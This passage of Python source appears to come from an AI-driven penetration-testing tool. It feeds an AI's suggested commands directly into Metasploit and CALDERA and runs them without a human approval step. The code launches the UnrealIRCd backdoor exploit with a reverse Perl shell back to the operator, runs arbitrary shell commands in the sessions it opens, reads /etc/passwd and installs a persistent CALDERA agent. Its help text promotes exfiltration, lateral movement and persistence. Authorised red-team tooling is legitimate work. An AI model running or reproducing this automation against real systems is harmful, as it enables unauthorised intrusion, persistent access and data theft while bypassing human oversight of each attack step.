        command_lower = command.lower().strip()

        # Metasploit commands
        if (command_lower == 'msfconsole' or
            self.msfconsole_active or
            any(pattern in command_lower for pattern in ['exploit/', 'auxiliary/', 'payload/', 'post/', 'use exploit', 'use auxiliary'])):
            return "metasploit"

        # CALDERA commands
        if any(pattern in command_lower for pattern in ['caldera', 'create_operation', 'list_abilities', 'list_agents']):
            return "caldera"

        # Scanner commands
        if any(pattern in command_lower for pattern in ['nmap', 'nikto', 'gobuster', 'dirb', 'wpscan']):
            return "scanner"

        # Default to scanner for other commands
        return "scanner"

    def start_pentest(self):
        """
        Start the AI-guided penetration testing process and continue automatically.
        This method initiates the workflow and manages transitions between phases.
        """
        from utils.prompt_templates import get_initial_prompt

        if self.output_callback:
            self.output_callback("🚀 Starting AI-guided penetration test", "system")
            self.output_callback(f"🎯 Target: {self.target_ip}", "system")

        # Initialize state
        self.current_phase = "initialization"
        self.msfconsole_active = False
        self.current_msf_module = None
        self.nmap_results = {}
        self.nmap_service_summary = ""

        # Initial prompt to start the penetration test
        initial_prompt = get_initial_prompt(self.target_ip)

        # Send initial prompt to AI
        response = self._send_to_ai(initial_prompt)

        # Parse the response
        parsed = self.parse_ai_response(response)

        # Update phase if suggested
        if parsed.get("next_phase"):
            self.current_phase = parsed.get("next_phase")
            if self.output_callback:
                self.output_callback(f"Moving to phase: {self.current_phase}", "system")

        # MAIN CHANGE: Process commands and continue automatically
        self._process_commands_and_continue(parsed.get("commands", []))

        if self.output_callback:
            self.output_callback("✅ Initial penetration testing phase completed", "system")

    def continue_pentest(self, user_input: str = ""):
        """
        Continue the penetration test based on user input or previous state.
        Modified to prioritize active sessions over starting new exploits and
        to handle 'run' commands with a synchronization fix.

        Args:
            user_input: Optional input from the user
        """
        try:
            # SPECIAL HANDLING FOR RUN COMMANDS: If user provided input starts with "run"
            if user_input and user_input.startswith("run "):
                # Extract the actual command
                command = user_input[4:].strip()

                if not command:  # Handle empty command after "run"
                    if self.output_callback:
                        self.output_callback("Error: No command specified after 'run'.", "error")
                    return

                # Special handling for "install agent" command
                if command == "install agent":
                    if self.output_callback:
                        self.output_callback("Installing CALDERA agent...", "system")
                    try:
                        from pymetasploit3.msfrpc import MsfRpcClient
                        client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                        sessions = client.sessions.list

                        if sessions:
                            session_id = list(sessions.keys())[0]
                            success = self._install_caldera_agent(client, session_id)
                            if success:
                                self.output_callback("CALDERA agent installation commands executed successfully.",
                                                     "success")
                            else:
                                self.output_callback("CALDERA agent installation failed.", "error")
                        else:
                            self.output_callback("No active sessions found for CALDERA agent installation.", "error")
                    except Exception as e:
                        logger.error(f"Error during CALDERA agent installation: {str(e)}")
                        self.output_callback(f"Error during CALDERA agent installation: {str(e)}", "error")
                    return

                # Check if we have an active session for regular commands
                from pymetasploit3.msfrpc import MsfRpcClient
                try:
                    client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                    sessions = client.sessions.list

                    if sessions:
                        # Get the first session ID
                        session_id = list(sessions.keys())[0]

                        if self.output_callback:
                            self.output_callback(f"Executing command in session {session_id}: {command}", "system")

                        # FIX: Add the required 'end_strs' parameter
                        end_markers = ['\n', '$ ', '# ', '> ']
                        result = client.sessions.session(session_id).run_with_output(command, end_strs=end_markers)

                        if self.output_callback:
                            self.output_callback(f"Result:\n{result}", "system")

                        return
                    else:
                        if self.output_callback:
                            self.output_callback("No active sessions found.", "error")
                except Exception as e:
                    logger.error(f"Error using direct RPC method: {str(e)}")

                    # Fall back to using console-based command
                    try:
                        if self.output_callback:
                            self.output_callback("Falling back to console-based command execution...", "system")

                        # Create and run a console
                        console = client.consoles.console()
                        console_id = console['id']

                        # Format the command with session ID
                        if hasattr(self, 'session_info') and self.session_info:
                            session_id = self.session_info.get('id', '1')
                        else:
                            session_id = list(sessions.keys())[0] if sessions else '1'

                        console_command = f"sessions -i {session_id} -c '{command}'"
                        client.consoles.console(console_id).write(console_command + "\n")

                        # Wait a moment for the command to execute
                        import time
                        time.sleep(2)

                        # Read the output
                        response = client.consoles.console(console_id).read()

                        if isinstance(response, dict) and 'data' in response:
                            output = response['data']
                            if self.output_callback:
                                self.output_callback(f"Result:\n{output}", "system")
                        else:
                            if self.output_callback:
                                self.output_callback("No output received from command.", "warning")

                        return
                    except Exception as console_error:
                        logger.error(f"Console fallback failed: {str(console_error)}")

                        # Final fallback: use the standard command format through metasploit interface
                        if hasattr(self, 'session_active') and self.session_active and hasattr(self, 'session_info'):
                            session_id = self.session_info.get('id', '1')
                            formatted_command = f"sessions -i {session_id} -c '{command}'"

                            if self.output_callback:
                                self.output_callback(
                                    f"Executing command using metasploit interface: {formatted_command}", "system")

                            result = self.metasploit.execute_command(formatted_command)

                            if self.output_callback:
                                self.output_callback(f"Result:\n{result}", "system")

                            return

            # Regular command handling (non-run commands)
            elif user_input and not user_input.startswith("run "):
                # Special handling for "help" command
                if user_input.lower() == "help":
                    # Display help information
                    help_text = """
    Available Commands:
    ------------------
    run <command>       - Execute a shell command on the target (e.g., run whoami, run ls -la)
    info system         - Gather basic system information (whoami, id, uname, etc.)
    upload <src> <dst>  - Upload a file to the target (not fully implemented)
    download <src> <dst>- Download a file from the target (not fully implemented)
    install agent       - Install CALDERA agent for persistent access
    help                - Display this help message

    Post-Exploitation Tips:
    ----------------------
    1. Use 'run whoami' and 'run id' to identify the current user
    2. Use 'run pwd' to see the current directory
    3. Use 'run ls -la' to list files in the current directory
    4. Use 'run cat /etc/passwd' to view user accounts
    5. Use 'run ps aux' to view running processes
    6. Use 'info system' for automated information gathering

    For more advanced operations, you can:
    - Explore the filesystem with 'run ls -la /'
    - Check network connections with 'run netstat -antup'
    - Look for interesting files with 'run find / -name "*.conf" 2>/dev/null'
    """

                    if self.output_callback:
                        self.output_callback(help_text, "system")
                    return

                # Special handling for "install agent" command without "run" prefix
                if user_input == "install agent":
                    if self.output_callback:
                        self.output_callback("Installing CALDERA agent...", "system")
                    try:
                        from pymetasploit3.msfrpc import MsfRpcClient
                        client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                        sessions = client.sessions.list

                        if sessions:
                            session_id = list(sessions.keys())[0]
                            success = self._install_caldera_agent(client, session_id)
                            if success:
                                self.output_callback("CALDERA agent installation commands executed successfully.",
                                                     "success")
                            else:
                                self.output_callback("CALDERA agent installation failed.", "error")
                        else:
                            self.output_callback("No active sessions found for CALDERA agent installation.", "error")
                    except Exception as e:
                        logger.error(f"Error during CALDERA agent installation: {str(e)}")
                        self.output_callback(f"Error during CALDERA agent installation: {str(e)}", "error")
                    return

                # For other regular commands, try to execute in session
                try:
                    from pymetasploit3.msfrpc import MsfRpcClient
                    client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)
                    sessions = client.sessions.list

                    if sessions:
                        session_id = list(sessions.keys())[0]

                        if self.output_callback:
                            self.output_callback(f"Treating as command in session {session_id}: {user_input}", "system")

                        # FIX: Add the required 'end_strs' parameter
                        end_markers = ['\n', '$ ', '# ', '> ']
                        result = client.sessions.session(session_id).run_with_output(user_input, end_strs=end_markers)

                        if self.output_callback:
                            self.output_callback(f"Result:\n{result}", "system")

                        return
                except Exception as e:
                    logger.error(f"Error executing direct command: {str(e)}")
                    # Continue with normal flow if direct command execution fails

            # FIRST CHECK: If we already have an active session, focus on that
            from pymetasploit3.msfrpc import MsfRpcClient

            try:
                # Try to connect to the Metasploit RPC server
                client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)

                # Check for active sessions
                sessions = client.sessions.list

                if sessions:
                    session_id = list(sessions.keys())[0]
                    session_info = sessions[session_id]

                    if self.output_callback:
                        self.output_callback(
                            f"You already have an active session (ID: {session_id})! Focusing on post-exploitation.",
                            "system")
                        self.output_callback("What would you like to do with this session? Some options:", "system")
                        self.output_callback("""
        1. Run a command in the session (Example: 'run whoami' or 'run id')
        2. Gather system information (Example: 'info system')
        3. Upload a file (Example: 'upload /path/to/file /destination/path')
        4. Download a file (Example: 'download /remote/file /local/path')
        5. Install a persistent agent (Example: 'install agent')
        6. Type 'help' for more information
                            """, "system")

                    # If user provided specific input, process it as a session command
                    if user_input and not user_input.startswith("run "):  # Already handled "run" commands above
                        if user_input.startswith("info system"):
                            # Special handler for the system info command
                            system_info_commands = [
                                "whoami", "id", "uname -a", "cat /etc/issue",
                                "cat /proc/version", "ifconfig", "netstat -antup",
                                "ps aux"
                            ]

                            if self.output_callback:
                                self.output_callback("Gathering system information...", "system")

                            for cmd in system_info_commands:
                                try:
                                    self.output_callback(f"Running: {cmd}", "system")
                                    # FIX: Add the required 'end_strs' parameter
                                    end_markers = ['\n', '$ ', '# ', '> ']
                                    result = client.sessions.session(session_id).run_with_output(cmd,
                                                                                                 end_strs=end_markers)
                                    self.output_callback(f"== {cmd} ==\n{result}", "system")
                                except Exception as cmd_error:
                                    self.output_callback(f"Error running {cmd}: {str(cmd_error)}", "error")

                        elif user_input.startswith("upload "):
                            # Handle upload command
                            parts = user_input.split(" ", 2)
                            if len(parts) < 3:
                                self.output_callback("Usage: upload /local/path /remote/path", "error")
                            else:
                                local_path = parts[1]
                                remote_path = parts[2]
                                self.output_callback(f"Upload feature not fully implemented yet.", "warning")

                        elif user_input.startswith("download "):
                            # Handle download command
                            parts = user_input.split(" ", 2)
                            if len(parts) < 3:
                                self.output_callback("Usage: download /remote/path /local/path", "error")
                            else:
                                remote_path = parts[1]
                                local_path = parts[2]
                                self.output_callback(f"Download feature not fully implemented yet.", "warning")

                        elif user_input.startswith("install agent"):
                            # Handle agent installation
                            if self.output_callback:
                                self.output_callback("Attempting to install CALDERA agent...", "system")
                            success = self._install_caldera_agent(client, session_id)
                            if success:
                                self.output_callback("CALDERA agent installation commands executed.", "success")
                            else:
                                self.output_callback("CALDERA agent installation failed.", "error")

                        else:
                            # Default - treat as a shell command
                            command = user_input

                            if self.output_callback:
                                self.output_callback(f"Executing command: {command}", "system")

                            # Execute the command directly via RPC
                            try:
                                # FIX: Add the required 'end_strs' parameter
                                end_markers = ['\n', '$ ', '# ', '> ']
                                result = client.sessions.session(session_id).run_with_output(command,
                                                                                             end_strs=end_markers)
                                if self.output_callback:
                                    self.output_callback(f"Result:\n{result}", "system")
                            except Exception as cmd_error:
                                self.output_callback(f"Error executing command: {str(cmd_error)}", "error")

                    # Since we have an active session, we don't need to continue with exploitation
                    return

            except Exception as e:
                # If there's an error checking for sessions, log it but continue with normal workflow
                logger.error(f"Error checking for sessions: {str(e)}")

            # If no active session was found or there was an error, continue with normal workflow
            if user_input:
                # If user provided input, send it to the AI
                prompt = f"User input: {user_input}\n\nContinue with the penetration test. Based on this input, what should we do next?"
                response = self._send_to_ai(prompt)
            else:
                # Create a context-aware prompt based on current state
                if self.current_phase == "vulnerability_identification" and hasattr(self,
                                                                                    'nmap_service_summary') and self.nmap_service_summary:
                    # Include the parsed scan results to help the AI make better choices
                    prompt = f"We are now in the vulnerability identification phase.\n\n{self.nmap_service_summary}\n\nBased on these services, which vulnerability should we focus on exploiting? Please provide specific searchsploit commands for the detected services and versions."
                else:
                    # Otherwise, just ask what to do next based on current phase
                    prompt = f"We're in the {self.current_phase} phase. What should we do next in the penetration test?"

                response = self._send_to_ai(prompt)

            # Parse the response
            parsed = self.parse_ai_response(response)

            # Update phase if suggested
            if parsed.get("next_phase"):
                self.current_phase = parsed.get("next_phase")
                if self.output_callback:
                    self.output_callback(f"Moving to phase: {self.current_phase}", "system")

            # Process commands automatically
            self._process_commands_and_continue(parsed.get("commands", []))

        except Exception as e:
            logger.error(f"Error in continue_pentest: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error continuing penetration test: {str(e)}", "error")
            # Log full traceback for debugging
            import traceback
            logger.error(f"Traceback: {traceback.format_exc()}")

    def _execute_tool_command_with_timeout(self, tool: str, command: str, timeout: int = 60) -> str:
        """
        Execute a command with the specified tool with timeout handling.

        Args:
            tool: The tool to use ('metasploit', 'caldera', 'scanner')
            command: The command to execute
            timeout: Timeout in seconds

        Returns:
            The command output
        """
        import threading
        import queue

        result_queue = queue.Queue()

        def execute_and_enqueue():
            try:
                if tool.lower() == "metasploit":
                    result = self._handle_metasploit_command(command)
                elif tool.lower() == "caldera":
                    result = self.caldera.execute_command(command)
                elif tool.lower() == "scanner":
                    result = self.scanner.execute_command(command)
                else:
                    result = f"Unknown tool: {tool}"

                result_queue.put(result)
            except Exception as e:
                result_queue.put(f"Error: {str(e)}")

        # Start execution in a separate thread
        thread = threading.Thread(target=execute_and_enqueue)
        thread.daemon = True
        thread.start()

        # Wait for the result or timeout
        try:
            result = result_queue.get(timeout=timeout)
            if self.output_callback:
                self.output_callback(f"Result: {result}", "system")
            return result
        except queue.Empty:
            if self.output_callback:
                self.output_callback(f"Command timed out after {timeout} seconds", "warning")
            return f"Command timed out after {timeout} seconds"

    def stop_pentest(self):
        """
        Properly stop the penetration test and clean up resources.
        """
        try:
            # Reset Metasploit state
            self.msfconsole_active = False
            self.current_msf_module = None
            self.session_active = False
            self.session_info = {}

            # Clean up Metasploit sessions
            self.metasploit.cleanup()

            # Clean up Caldera operations
            self.caldera.cleanup()

            if self.output_callback:
                self.output_callback("🛑 Penetration test stopped and resources cleaned up", "system")

        except Exception as e:
            logger.error(f"Error stopping penetration test: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error stopping penetration test: {str(e)}", "error")

    def exploit_unrealircd_direct(self, port="6697"):
        """
        Directly exploit the UnrealIRCd backdoor using the Metasploit RPC client
        with the exact command sequence.

        Args:
            port: The port where the IRC service is running (default: 6697)

        Returns:
            Boolean indicating success or failure
        """
        try:
            # Import the required library
            from pymetasploit3.msfrpc import MsfRpcClient

            # Get local IP
            local_ip = self._get_local_ip()

            if self.output_callback:
                self.output_callback(f"Attempting to exploit UnrealIRCd backdoor on port {port}...", "system")

            # Connect to the MSF RPC server
            client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)

            if self.output_callback:
                self.output_callback("Connected to Metasploit RPC server", "system")

            # Get console or create one
            console_list = client.consoles.list
            console_id = None

            if console_list and len(console_list) > 0:
                for console in console_list:
                    if not console['busy']:
                        console_id = console['id']
                        break

            if not console_id:
                console = client.consoles.console()
                console_id = console['id']

            if self.output_callback:
                self.output_callback(f"Using console ID: {console_id}", "system")

            # The exact command sequence from your example, but with configurable port
            commands = [
                'use exploit/unix/irc/unreal_ircd_3281_backdoor',
                f'set RHOSTS {self.target_ip}',
                f'set RPORT {port}',
                'set payload cmd/unix/reverse_perl',
                f'set LHOST {local_ip}',
                'show options'
            ]

            # Execute each command in sequence
            for command in commands:
                if self.output_callback:
                    self.output_callback(f"Executing: {command}", "system")

                client.consoles.console(console_id).write(command + "\n")
                time.sleep(1)  # Give it time to process

                # Read command output
                result = client.consoles.console(console_id).read()
                if result and 'data' in result:
                    clean_output = self._clean_ansi_codes(result['data'])
                    if self.output_callback:
                        self.output_callback(clean_output, "system")

            # Run the exploit
            if self.output_callback:
                self.output_callback("Running exploit...", "system")

            client.consoles.console(console_id).write("run\n")

            # Wait for session establishment
            session_established = False
            for _ in range(10):  # Try for about 30 seconds
                time.sleep(3)

                # Read output
                result = client.consoles.console(console_id).read()
                if result and 'data' in result:
                    clean_output = self._clean_ansi_codes(result['data'])
                    if self.output_callback:
                        self.output_callback(clean_output, "system")

                    # Look for session establishment messages
                    if "session" in clean_output.lower() and "opened" in clean_output.lower():
                        session_established = True
                        if self.output_callback:
                            self.output_callback("Session established!", "success")

                # Check sessions directly
                sessions = client.sessions.list
                if sessions and len(sessions) > 0:
                    session_established = True
                    if self.output_callback:
                        self.output_callback(f"Active sessions: {sessions}", "system")

                    # Store session info
                    session_id = list(sessions.keys())[0]
                    self.session_active = True
                    self.session_info = {
                        'id': session_id,
                        'type': sessions[session_id].get('type', 'shell')
                    }

                    # Update phase to post-exploitation
                    self.current_phase = "post_exploitation"

                    return True

                # If console is no longer busy, we can break early
                if not result.get('busy', True) and _ >= 3:
                    break

            if not session_established:
                if self.output_callback:
                    self.output_callback(f"Failed to establish a session with UnrealIRCd exploit on port {port}.",
                                         "warning")
                return False

            return session_established

        except Exception as e:
            logger.error(f"Error in UnrealIRCd exploit: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error in UnrealIRCd exploit: {str(e)}", "error")
            return False

    def extended_scan_for_irc(self):
        """
        Perform an additional scan specifically looking for IRC services on common IRC ports.
        """
        try:
            # Common IRC ports
            irc_ports = "6666,6667,6697,6698,6699,7000"

            if self.output_callback:
                self.output_callback(f"Running targeted scan for IRC services on ports {irc_ports}...", "system")

            # Execute nmap scan focused on IRC ports
            command = f"nmap -sV -p {irc_ports} {self.target_ip}"

            # Use the scanner interface to execute the command
            result = self.scanner.execute_command(command)

            # Check if IRC service was found
            irc_found = False
            irc_port = None

            for line in result.split('\n'):
                if ("/tcp" in line and "open" in line and
                        ("irc" in line.lower() or "unrealircd" in line.lower())):
                    irc_found = True
                    # Extract the port number
                    port = line.split('/')[0].strip()
                    irc_port = port
                    if self.output_callback:
                        self.output_callback(f"IRC service detected on port {port}!", "success")
                    break

            return irc_found, irc_port

        except Exception as e:
            logger.error(f"Error in extended IRC scan: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error in extended IRC scan: {str(e)}", "error")
            return False, None

    def handle_post_exploitation(self, session_id):
        """
        Handle post-exploitation tasks for an established session.

        Args:
            session_id: The ID of the established session
        """
        try:
            from pymetasploit3.msfrpc import MsfRpcClient

            if self.output_callback:
                self.output_callback(f"Starting post-exploitation for session {session_id}...", "system")

            # Connect to the MSF RPC server
            client = MsfRpcClient('password', server='127.0.0.1', port=55553, ssl=False)

            # Get session information
            sessions = client.sessions.list
            if session_id not in sessions:
                if self.output_callback:
                    self.output_callback(f"Session {session_id} not found in active sessions.", "error")
                return

            session_info = sessions[session_id]
            session_type = session_info.get('type', 'shell')

            if self.output_callback:
                self.output_callback(f"Working with {session_type} session {session_id}.", "system")

            # Run basic information gathering commands
            commands = [
                "whoami",
                "id",
                "uname -a",
                "ifconfig",
                "cat /etc/passwd | grep -i bash",
                "ls -la /home"
            ]

            # Get console or create one
            console_list = client.consoles.list
            console_id = None

            if console_list and len(console_list) > 0:
                for console in console_list:
                    if not console['busy']:
                        console_id = console['id']
                        break

            if not console_id:
                console = client.consoles.console()
                console_id = console['id']

            if self.output_callback:
                self.output_callback(f"Using console ID: {console_id} for post-exploitation.", "system")

            # Execute basic information gathering
            if self.output_callback:
                self.output_callback("Gathering basic system information...", "system")

            for command in commands:
                # Format the command for execution in the session
                console_command = f"sessions -i {session_id} -c '{command}'"

                if self.output_callback:
                    self.output_callback(f"Executing: {console_command}", "system")

                client.consoles.console(console_id).write(console_command + "\n")
                time.sleep(2)  # Give it time to execute

                # Read the output
                result = client.consoles.console(console_id).read()
                if result and 'data' in result:
                    clean_output = self._clean_ansi_codes(result['data'])
                    if self.output_callback:
                        self.output_callback(f"Result of '{command}':\n{clean_output}", "system")

            # Attempt to install CALDERA agent
            if session_type in ['meterpreter', 'shell']:
                if self.output_callback:
                    self.output_callback("Attempting to install CALDERA agent...", "system")

                self._install_caldera_agent(client, session_id)

            # Provide guidance for further exploitation
            if self.output_callback:
                self.output_callback("""
    Post-exploitation completed. You now have an active shell session on the target.
    You can interact with this session using the Metasploit Framework or through this interface.

    Some useful next steps:
    1. Privilege escalation attempts
    2. Network enumeration
    3. Data exfiltration
    4. Lateral movement to other systems
    5. Persistence establishment

    Would you like to attempt any specific post-exploitation tasks?
    """, "system")

        except Exception as e:
            logger.error(f"Error in post-exploitation: {str(e)}")
            if self.output_callback:
                self.output_callback(f"Error in post-exploitation: {str(e)}", "error")
            import traceback
            logger.error(traceback.format_exc())